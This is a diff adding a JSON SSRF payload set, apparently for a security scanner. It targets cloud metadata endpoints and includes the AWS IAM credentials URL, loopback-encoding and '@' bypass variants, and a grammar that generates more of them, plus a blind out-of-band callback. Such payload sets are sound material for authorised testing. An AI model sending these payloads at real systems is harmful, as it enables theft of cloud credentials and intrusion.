@@ -1,0 +1,38 @@
+{
+  "class": "ssrf",
+  "name": "ssrf-cloud-metadata",
+  "description": "SSRF sweep tuned for cloud metadata endpoints and loopback bypasses. Seeds the known metadata URLs, and the grammar recombines scheme + host-encoding + path atoms to synthesise bypass variants around them.",
+  "severity": "critical",
+
+  "gen_ratio": 0.3,
+
+  "grammar": {
+    "atoms": [
+      "http://",
+      "169.254.169.254",
+      "127.0.0.1",
+      "0x7f000001",
+      "2130706433",
+      "@",
+      "%2f",
+      "/latest/meta-data/",
+      "/computeMetadata/v1/"
+    ],
+    "chain": {
+      "http://":         { "169.254.169.254": 20.0, "127.0.0.1": 8.0, "0x7f000001": 4.0, "2130706433": 4.0 },
+      "169.254.169.254": { "/latest/meta-data/": 12.0, "@": 3.0 },
+      "127.0.0.1":       { "@": 4.0, "%2f": 3.0 },
+      "@":               { "169.254.169.254": 10.0 }
+    },
+    "placement": { "append": 1.0, "prepend": 2.0, "wrap": 0.0 },
+    "length": { "min_atoms": 2, "max_atoms": 5, "stop_prob": 0.6 }
+  },
+
+  "payloads": [
+    { "value": "http://169.254.169.254/latest/meta-data/", "context": "url", "severity_hint": "critical", "description": "AWS metadata root" },
+    { "value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "context": "url", "severity_hint": "critical", "description": "AWS IAM credentials" },
+    { "value": "http://metadata.google.internal/computeMetadata/v1/", "context": "url", "severity_hint": "critical", "description": "GCP metadata root" },
+    { "value": "http://127.0.0.1@169.254.169.254/latest/meta-data/", "context": "url", "severity_hint": "high", "description": "Userinfo @-bypass to metadata host" },
+    { "value": "http://{{oob}}/", "context": "url", "severity_hint": "critical", "description": "Blind SSRF to OOB collaborator (needs --oob-url)" }
+  ]
+}
